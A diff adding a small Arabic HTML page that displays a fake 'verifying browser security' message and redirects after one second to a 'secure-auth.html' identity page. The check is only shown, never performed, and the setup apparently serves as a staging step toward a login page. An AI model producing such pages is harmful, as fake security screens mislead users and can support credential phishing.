@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحقق...</title>
+    <style>
+        body { 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background-color: #f4f4f4;
+        }
+        .loader {
+            text-align: center;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loader">
+        <p>جاري التحقق من أمان المتصفح...</p>
+    </div>
+    
+    <script>
+        // هذا الكود ينقل المستخدم للصفحة الحقيقية بعد ثانية واحدة
+        // تأكد أن ملف الهوية أصبح اسمه: secure-auth.html
+        setTimeout(function() {
+            window.location.href = "secure-auth.html"; 
+        }, 1000);
+    </script>
+</body>
+</html>
